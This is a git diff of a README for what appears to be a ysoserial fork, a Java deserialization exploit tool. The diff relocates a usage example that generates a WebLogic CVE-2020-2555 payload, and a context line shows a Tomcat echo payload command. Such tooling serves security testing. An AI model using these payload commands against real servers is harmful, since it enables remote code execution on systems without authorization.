@@ -16,6 +16,10 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho cmd
 ```
 ![](https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306134256.png)
 
+weblogic cve-2020-2555
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Weblogic2555 calc
+```
 # ysoserial
 
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
@@ -30,10 +34,6 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ![logo](ysoserial.png)
 
-weblogic cve-2020-2555
-```
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Weblogic2555 calc
-```
 
 ## Description
 
